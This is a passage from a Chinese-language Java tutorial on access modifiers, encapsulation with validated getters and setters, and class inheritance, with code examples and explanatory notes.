  <span class="hljs-keyword">public</span> <span class="hljs-type">int</span> <span class="hljs-variable">n1</span> <span class="hljs-operator">=</span> <span class="hljs-number">100</span>;<br>    <span class="hljs-keyword">protected</span> <span class="hljs-type">int</span> <span class="hljs-variable">n2</span> <span class="hljs-operator">=</span> <span class="hljs-number">200</span>;<br>    <span class="hljs-type">int</span> <span class="hljs-variable">n3</span> <span class="hljs-operator">=</span> <span class="hljs-number">300</span>;<br>    <span class="hljs-keyword">private</span> <span class="hljs-type">int</span> <span class="hljs-variable">n4</span> <span class="hljs-operator">=</span> <span class="hljs-number">400</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">m1</span><span class="hljs-params">()</span>&#123;<br>        <span class="hljs-comment">//该方法可以访问4个属性</span><br>        System.out.println(<span class="hljs-string">&quot;n1=&quot;</span>+n1+<span class="hljs-string">&quot; n2=&quot;</span>+n2+<span class="hljs-string">&quot; n3=&quot;</span>+n3+<span class="hljs-string">&quot; n4&quot;</span>+n4);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>B.class（同包下）</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> com.hspedu.modifier;<br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">B</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">say</span><span class="hljs-params">()</span> &#123;<br>        <span class="hljs-type">A</span> <span class="hljs-variable">a</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">A</span>();<br>        <span class="hljs-comment">//在同一个包下，可以访问public,protected和默认，不能访问private</span><br>        System.out.println(<span class="hljs-string">&quot; &quot;</span>+a.n1+<span class="hljs-string">&quot; &quot;</span>+a.n2+<span class="hljs-string">&quot; &quot;</span>+a.n3+<span class="hljs-string">&quot; &quot;</span>);<br><br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>Test.class</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> com.hspedu.modifier;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Test</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> &#123;<br>        <span class="hljs-type">A</span> <span class="hljs-variable">a</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">A</span>();<br>        a.m1();<br>        <span class="hljs-type">B</span> <span class="hljs-variable">b</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">B</span>();<br>        b.say();<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><img src="https://soya-1300102518.cos.ap-shenzhen-fsi.myqcloud.com/2022/image-20220914170102818.png" alt="image-20220914170102818" style="zoom:50%;" /><p>pkg包下：</p><p>Test.class</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> com.hspedu.pkg;<br><br><span class="hljs-keyword">import</span> com.hspedu.modifier.A;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Test</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> &#123;<br>        <span class="hljs-type">A</span> <span class="hljs-variable">a</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">A</span>();<br>        <span class="hljs-comment">//在不同包下，可以访问public修饰的属性或方法</span><br>        System.out.println(a.n1);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>输出：100</p><p>ps:<strong>类只有默认和public可以修饰</strong></p><h2 id="4-封装"><a href="#4-封装" class="headerlink" title="4.封装"></a>4.封装</h2><p>封装（encapsulation）就是把抽象出的数据［<strong>属性</strong>］和对数据的操作［<strong>方法</strong>］<strong>封装在一起</strong>，数据被保护在内部，程序的其它部分只有通过被授权的操作［方法］，才能对数据进行操作。</p><p><strong>封装的优点：</strong></p><ol><li>隐藏实现细节：方法（连接数据库）&lt;-调用（传入参数）</li><li>可以对数据惊醒验证，保证安全合理</li></ol><h3 id="封装的步骤"><a href="#封装的步骤" class="headerlink" title="封装的步骤"></a>封装的步骤</h3><ol><li><p>将属性进行私有化（不能直接修改属性）</p></li><li><p>提供一个公共的（public）set方法，用于对属性判断并赋值</p><ul><li>&#96;&#96;&#96;java<br>public void setXXX(类型 参数名){<br>&#x2F;&#x2F;加入数据验证的业务逻辑<br>  属性 &#x3D; 参数名;<br>}<figure class="highlight csharp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs csharp"><br><span class="hljs-number">3.</span> 提供一个公共的<span class="hljs-keyword">get</span>方法，用于获取属性的值<br><br>   - ```<span class="hljs-function">java</span><br><span class="hljs-function">     <span class="hljs-keyword">public</span> XX <span class="hljs-title">getXXX</span>()</span>&#123;<br>     <span class="hljs-keyword">return</span> xxx; <span class="hljs-comment">//权限判断</span><br>     &#125;<br></code></pre></td></tr></table></figure></li></ul></li></ol><p>案例：</p><blockquote><p>设计一个小程序（Encapsulation01.java），不能随便查看人的年龄，工资等隐私，并对设置的年龄进行合理的验证。年龄合理就设置，否则给默认年龄必须在1-120，年龄，工资不能直接查看， name的长度在2-6之间</p></blockquote><img src="https://soya-1300102518.cos.ap-shenzhen-fsi.myqcloud.com/2022/image-20220914230233716.png" alt="image-20220914230233716" style="zoom:50%;" /><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> com.hspedu.encap;<br><br><span class="hljs-comment">//默认年龄必须在1-120，年龄，工资不能直接查看，name的长度在2-6之间</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Encapsulation01</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> &#123;<br>        <span class="hljs-type">Person</span> <span class="hljs-variable">person</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Person</span>();<br>        person.setName(<span class="hljs-string">&quot;jack&quot;</span>);<br>        person.setAge(<span class="hljs-number">150</span>);<br>        person.setSalary(<span class="hljs-number">30000</span>);<br>        System.out.println(person.info());<br>        System.out.println(person.getSalary());<br>    &#125;<br>&#125;<br><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">Person</span> &#123;<br>    <span class="hljs-keyword">public</span> String name;<span class="hljs-comment">//公开名字</span><br>    <span class="hljs-keyword">private</span> <span class="hljs-type">int</span> age;<span class="hljs-comment">//私有年龄</span><br>    <span class="hljs-keyword">private</span> <span class="hljs-type">double</span> salary;<span class="hljs-comment">//私有薪水</span><br><br>    <span class="hljs-comment">//快捷键生成get(),set()</span><br>    <span class="hljs-comment">//根据要求完善代码</span><br>    <span class="hljs-keyword">public</span> String <span class="hljs-title function_">getName</span><span class="hljs-params">()</span> &#123;<br>        <span class="hljs-keyword">return</span> name;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">setName</span><span class="hljs-params">(String name)</span> &#123;<br>        <span class="hljs-comment">//加入对数据的校验</span><br>        <span class="hljs-keyword">if</span> (name.length() &gt;= <span class="hljs-number">2</span> &amp;&amp; name.length() &lt;= <span class="hljs-number">6</span>) &#123;<br>            <span class="hljs-built_in">this</span>.name = name;<br>        &#125; <span class="hljs-keyword">else</span> &#123;<br>            System.out.println(<span class="hljs-string">&quot;名字长度不对，需要（2-6）个字符，默认名字佚名&quot;</span>);<br>            <span class="hljs-built_in">this</span>.name = <span class="hljs-string">&quot;佚名&quot;</span>;<br>        &#125;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-type">int</span> <span class="hljs-title function_">getAge</span><span class="hljs-params">()</span> &#123;<br>        <span class="hljs-keyword">return</span> age;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">setAge</span><span class="hljs-params">(<span class="hljs-type">int</span> age)</span> &#123;<br>        <span class="hljs-comment">//判断</span><br>        <span class="hljs-keyword">if</span> (age &gt;= <span class="hljs-number">1</span> &amp;&amp; age &lt;= <span class="hljs-number">120</span>) &#123;<br>            <span class="hljs-built_in">this</span>.age = age;<br>        &#125; <span class="hljs-keyword">else</span> &#123;<br>            System.out.println(<span class="hljs-string">&quot;年龄需要在1-120，默认年龄为18&quot;</span>);<br>            <span class="hljs-built_in">this</span>.age = <span class="hljs-number">18</span>; <span class="hljs-comment">//默认年龄</span><br>        &#125;<br><br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-type">double</span> <span class="hljs-title function_">getSalary</span><span class="hljs-params">()</span> &#123;<br>        <span class="hljs-comment">//增加对当前对象的权限判断</span><br>        <span class="hljs-keyword">return</span> salary;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">setSalary</span><span class="hljs-params">(<span class="hljs-type">double</span> salary)</span> &#123;<br>        <span class="hljs-built_in">this</span>.salary = salary;<br>    &#125;<br><br>    <span class="hljs-comment">//写一个方法，返回信息属性</span><br>    <span class="hljs-keyword">public</span> String <span class="hljs-title function_">info</span><span class="hljs-params">()</span> &#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;信息为name=&quot;</span> + name + <span class="hljs-string">&quot; age=&quot;</span> + age + <span class="hljs-string">&quot; 薪水=&quot;</span> + salary;<br>    &#125;<br>&#125;<br><br></code></pre></td></tr></table></figure><p>写构造器会让验证被覆盖，也可以将set写在构造器中。</p><h3 id="练习-2"><a href="#练习-2" class="headerlink" title="练习"></a>练习</h3><blockquote><p><img src="https://soya-1300102518.cos.ap-shenzhen-fsi.myqcloud.com/2022/image-20220915150213482.png" alt="image-20220915150213482"></p></blockquote><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-comment">//AccountText.java</span><br><span class="hljs-keyword">package</span> com.hspedu.encap;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">AccountText</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> &#123;<br>        <span class="hljs-type">Account</span> <span class="hljs-variable">account</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Account</span>();<br>        account.setName(<span class="hljs-string">&quot;jack&quot;</span>);<br>        account.setBalance(<span class="hljs-number">200</span>);<br>        account.setPassword(<span class="hljs-string">&quot;123456&quot;</span>);<br><br>        System.out.println(account.info());<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-comment">//Account.java</span><br><span class="hljs-keyword">package</span> com.hspedu.encap;<br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Account</span> &#123;<br>    <span class="hljs-comment">//为了封装，设置成私密</span><br>    <span class="hljs-keyword">private</span> String name;<br>    <span class="hljs-keyword">private</span> <span class="hljs-type">double</span> balance;<br>    <span class="hljs-keyword">private</span> String password;<br><br>    <span class="hljs-comment">//提供两个构造器</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-title function_">Account</span><span class="hljs-params">()</span> &#123;<br><br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-title function_">Account</span><span class="hljs-params">(String name, <span class="hljs-type">double</span> balance, String password)</span> &#123;<br>        <span class="hljs-built_in">this</span>.setName(name);<br>        <span class="hljs-built_in">this</span>.setBalance(balance);<br>        <span class="hljs-built_in">this</span>.setPassword(password);<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> String <span class="hljs-title function_">getName</span><span class="hljs-params">()</span> &#123;<br>        <span class="hljs-keyword">return</span> name;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">setName</span><span class="hljs-params">(String name)</span> &#123;<br>        <span class="hljs-keyword">if</span> (name.length() &gt;= <span class="hljs-number">2</span> &amp;&amp; name.length() &lt;= <span class="hljs-number">4</span>) &#123;<br>            <span class="hljs-built_in">this</span>.name = name;<br>        &#125; <span class="hljs-keyword">else</span> &#123;<br>            System.out.println(<span class="hljs-string">&quot;名字长度应为（2-4）位&quot;</span>);<br>        &#125;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-type">double</span> <span class="hljs-title function_">getBalance</span><span class="hljs-params">()</span> &#123;<br>        <span class="hljs-keyword">return</span> balance;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">setBalance</span><span class="hljs-params">(<span class="hljs-type">double</span> balance)</span> &#123;<br>        <span class="hljs-keyword">if</span> (balance&gt;<span class="hljs-number">20</span>)&#123;<br>            <span class="hljs-built_in">this</span>.balance=balance;<br>        &#125;<span class="hljs-keyword">else</span>&#123;<br>            System.out.println(<span class="hljs-string">&quot;余额应大于20&quot;</span>);<br>        &#125;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> String <span class="hljs-title function_">getPassword</span><span class="hljs-params">()</span> &#123;<br>        <span class="hljs-keyword">return</span> password;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">setPassword</span><span class="hljs-params">(String password)</span> &#123;<br>        <span class="hljs-keyword">if</span> (password.length()==<span class="hljs-number">6</span>)&#123;<br>            <span class="hljs-built_in">this</span>.password = password;<br>        &#125;<span class="hljs-keyword">else</span>&#123;<br>            System.out.println(<span class="hljs-string">&quot;密码必须为6位，默认密码为666666&quot;</span>);<br>            <span class="hljs-built_in">this</span>.password = <span class="hljs-string">&quot;666666&quot;</span>;<br>        &#125;<br>    &#125;<br>    <span class="hljs-keyword">public</span> String <span class="hljs-title function_">info</span><span class="hljs-params">()</span>&#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;姓名:&quot;</span>+name+<span class="hljs-string">&quot; 余额:&quot;</span>+balance+<span class="hljs-string">&quot; 密码:&quot;</span>+password;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><img src="https://soya-1300102518.cos.ap-shenzhen-fsi.myqcloud.com/2022/image-20220915220056605.png" alt="image-20220915220056605" style="zoom:50%;" /><h2 id="5-继承"><a href="#5-继承" class="headerlink" title="5.继承"></a>5.继承</h2><p>Q:为什么需要继承？</p><p>A:类的相似度高，冗余度高。</p><p>继承可以解决代码复用，让我们的编程更加靠近人类思维。当多个类存在相同的属性（变量）和方法时，可以从这些类中抽象出父类，在父类中定义这些相同的属性和方法，所有的子类不需要重新定义这些属性和方法，只需要通过extends来声明继承父类即可。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-comment">//继承的基本语法</span><br>class 子类 extends 父类&#123;<br>&#125;<br><span class="hljs-comment">/**</span><br><span class="hljs-comment">1）子类就会自动拥有父类定义的属性和方法</span><br><span class="hljs-comment">2）父类又叫 超类，基类。</span><br><span class="hljs-comment">3）子类又叫派生类。</span><br><span class="hljs-comment">**/</span><br></code></pre></td></tr></table></figure><p><img src="https://soya-1300102518.cos.ap-shenzhen-fsi.myqcloud.com/2022/image-20220915230750703.png" alt="image-20220915230750703"></p><h3 id="入门案例"><a href="#入门案例" class="headerlink" title="入门案例"></a>入门案例</h3><p>pupil和graduate类有重叠的部分，归为student父类。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-comment">//Student.java</span><br><br><span class="hljs-keyword">package</span> com.hspedu.extend.improve_;<br><span class="hljs-comment">//父类，是pupil和graduate的父类</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Student</span> &#123;<br>    <span class="hljs-comment">//公有属性</span><br>    <span class="hljs-keyword">public</span> String name;<br>    <span class="hljs-keyword">public</span> <span class="hljs-type">int</span> age;<br>    <span class="hljs-keyword">private</span> <span class="hljs-type">double</span> score;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">setScore</span><span class="hljs-params">(<span class="hljs-type">double</span> score)</span>&#123;<br>        <span class="hljs-built_in">this</span>.score = score;<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">showinfo</span><span class="hljs-params">()</span>&#123;<br>        System.out.println(<span class="hljs-string">&quot;学生名 &quot;</span>+name+<span class="hljs-string">&quot;年龄 &quot;</span>+age+<span class="hljs-string">&quot; 成绩 &quot;</span>+score);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-comment">//Graduate.java</span><br><span class="hljs-keyword">package</span> com.hspedu.extend.improve_;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Graduate</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">Student</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">testing</span><span class="hljs-params">()</span>&#123;<br>        System.out.println(<span class="hljs-string">&quot;大学生&quot;</span>+name+<span class="hljs-string">&quot;正在考大学数学..&quot;</span>);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-comment">//Pupil.java</span><br><br><span class="hljs-keyword">package</span> com.hspedu.extend.improve_;<br><span class="hljs-comment">//让Pupil继承类</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Pupil</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">Student</span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">testing</span><span class="hljs-params">()</span>&#123;<br>        System.out.println(<span class="hljs-string">&quot;小学生&quot;</span>+name+<span class="hljs-string">&quot;正在考大学数学..&quot;</span>);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-comment">//Extends01.java</span><br><span class="hljs-keyword">package</span> com.hspedu.extend.improve_;<br><span class="hljs-keyword">import</span> com.hspedu.extend.Graduate;<br><span class="hljs-keyword">import</span> com.hspedu.extend.Pupil;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Extends01</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> &#123;<br>        <span class="hljs-type">Pupil</span> <span class="hljs-variable">pupil</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Pupil</span>();<br>        pupil.name = <span class="hljs-string">&quot;银角大王&quot;</span>;<br>        pupil.age = <span class="hljs-number">10</span>;<br>        pupil.testing();<br>        pupil.setScore(<span class="hljs-number">60</span>);<br>        pupil.showinfo();<br><br>        <span class="hljs-type">Graduate</span> <span class="hljs-variable">graduate</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Graduate</span>();<br>        graduate.name = <span class="hljs-string">&quot;金角大王&quot;</span>;<br>        graduate.age = <span class="hljs-number">22</span>;<br>        graduate.testing();<br>        graduate.setScore(<span class="hljs-number">100</span>);<br>        graduate.showinfo();<br>    &#125;&#125;<br></code></pre></td></tr></table></figure><img src="https://soya-1300102518.cos.ap-shenzhen-fsi.myqcloud.com/2022/image-20220915233656197.png" alt="image-20220915233656197" style="zoom:50%;" /><p>继承的便利：</p><ol><li>代码的复用性提高了</li><li>代码的扩展性和维护性提高了</li></ol><h3 id="细节"><a href="#细节" class="headerlink" title="细节"></a>细节</h3><ol><li><p>子类继承了所有属性和方法，<strong>非私有的属性和方法可以在子类中直接访问</strong>，但<strong>私有属性和方法不能在子类直接访问</strong>，要通过父类提供公共的方法去访问.</p></li><li><p>子类必须调用父类的构造器，完成父类的初始化</p><ul><li>子类默认调用父类的无参构造器</li></ul></li><li><p>当创造子类对象时，不管使用子类的哪个构造器，默认情况下总会去调用父类的无参构造器，<strong>如果父类没有提供无参构造器，则必须在子类的构造器中用super去指定使用父类的哪个构造器完成对父类的初始化工作</strong>，否则，编译不会通过。</p></li><li><p>如果希望指定去调用父类的某个构造器，则显式的调用一下：super（参数列表）</p></li><li><p>super在使用时，需要放在构造器第一行。</p></li><li><p>super()和this()都只能放在构造器第一行，因此这两个方法不能共存在一个构造器</p></li><li><p>java所有类都是Object类的子类，Object是所有类的基类。</p><ul><li><img src="https://soya-1300102518.cos.ap-shenzhen-fsi.myqcloud.com/2022/image-20220916214758411.png" alt="image-20220916214758411" style="zoom: 50%;" /></li></ul></li><li><p>父类构造器的调用不限于直接父类，将一直往上追溯直到Object类（顶级父类）</p></li><li><p>子类最多只能继承一个父类（指直接继承），即java中是单继承机制。</p></li><li><p>不能滥用继承，子类和父类之间必须满足is-a的逻辑关系</p><blockquote><p>is-a：指的是类的父子继承关系，例如“D<strong>is a</strong>B”，在面向对象程序设计里，<em>is-a</em>类关系是在继承概念的背景之下所形成的。有一说法是，对于所有水果来说，苹果继承（<em>inherit</em>）所有的属性，就像是肉质多的水果包住种子般。</p></blockquote></li></ol><h3 id="本质分析"><a href="#本质分析" class="headerlink" title="本质分析"></a>本质分析</h3><p>案例：</p><p>分析当子类继承父类，创建子类对象时，内存中发生了什么？</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> com.hspedu.extend_;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">ExtendsTheory</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> &#123;<br>        <span class="hljs-type">Son</span> <span class="hljs-variable">son</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Son</span>(); <span class="hljs-comment">//内存的布局</span><br>    &#125;<br>&#125;<br><span class="hljs-keyword">class</span> <span class="hljs-title class_">GrandPa</span> &#123; <span class="hljs-comment">//爷爷类</span><br>    <span class="hljs-type">String</span> <span class="hljs-variable">name</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;大头爷爷&quot;</span>;<br>    <span class="hljs-type">String</span> <span class="hljs-variable">hobby</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;旅游&quot;</span>;<br>&#125;<br><span class="hljs-keyword">class</span> <span class="hljs-title class_">Father</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">GrandPa</span> &#123; <span class="hljs-comment">//父类</span><br>    <span class="hljs-type">String</span> <span class="hljs-variable">name</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;大头爸爸&quot;</span>;<br>    <span class="hljs-type">int</span> <span class="hljs-variable">age</span> <span class="hljs-operator">=</span> <span class="hljs-number">39</span>;<br>&#125;<br><span class="hljs-keyword">class</span> <span class="hljs-title class_">Son</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">Father</span> &#123; <span class="hljs-comment">//子类</span><br>    <span class="hljs-type">String</span> <span class="hljs-variable">name</span> <span class="hljs-operator">=</span> <span 